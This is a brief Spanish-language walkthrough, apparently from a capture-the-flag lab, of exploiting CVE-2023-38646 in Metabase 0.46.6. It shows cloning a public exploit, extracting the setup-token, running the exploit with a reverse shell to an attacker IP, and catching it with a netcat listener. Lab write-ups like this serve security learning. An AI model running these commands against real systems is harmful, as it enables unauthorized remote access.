#CVE-2023-38646

------

Vulnerabilidad para metabase 0.46.6

---

Vamos a utilizar el siguiente repositorio de [UserConecting](https://github.com/UserConnecting/Exploit-CVE-2023-38646-Metabase)
Con [[git clone]] usando `git clone https://github.com/UserConnecting/Exploit-CVE-2023-38646-Metabase` lo vamos a clonar en nuestro directorio actual de trabajo

Nos dice entremos al siguiente link http://data.analytical.htb/api/session/properties para sacar el setup-token, que lo vamos a necesitar para hacer la explotacion
![[Analytics16.png]]
*249fa03d-fd94-4d5b-b94f-b4ebf3df681f*

Ahora vamos a usar el comando `python3 metabase_exploit.py http://data.analytical.htb 249fa03d-fd94-4d5b-b94f-b4ebf3df681f revshell 10.10.16.15:443` para ejecutar el exploit, mientras estamos en escucha con [[nc -nlvp 443]]

![[Analytics17.png]]

![[Analytics18.png]]
Y ya ganamos acceso como el usuario metabase, aunque como no es una tty, no nos va a dejar hacer un [[Tratamiento de la TTY]]